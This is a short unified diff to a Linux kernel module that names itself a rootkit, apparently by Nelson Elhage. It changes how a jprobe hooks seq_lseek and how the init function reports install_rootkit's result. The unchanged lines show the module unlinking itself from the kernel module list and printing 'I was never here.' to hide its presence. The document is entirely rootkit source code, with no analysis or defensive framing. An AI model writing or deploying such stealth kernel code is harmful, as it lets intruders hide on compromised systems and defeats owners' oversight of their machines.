@@ -9,7 +9,6 @@
 #include <linux/err.h>
 
 #include <linux/kprobes.h>
-#include <linux/seq_file.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Nelson Elhage");
@@ -37,7 +36,7 @@ static int my_lseek(struct file *file, loff_t offset, int whence) {
 struct jprobe probe = {
 	.kp =
 	{
-		.addr = (kprobe_opcode_t *)seq_lseek,
+		.symbol_name = "seq_lseek",
 	},
 	.entry = (void*)my_lseek,
 };
@@ -53,9 +52,7 @@ static int __init hello_rc_init(void) {
 		list_del(&THIS_MODULE->list);
 		printk(KERN_INFO "I was never here.\n");
 	}
-	if (install_rootkit() != 0)
-		printk(KERN_INFO "Error registering probe!\n");
-	return 0;
+	return install_rootkit();
 }
 
 static void __exit hello_rc_exit(void) {
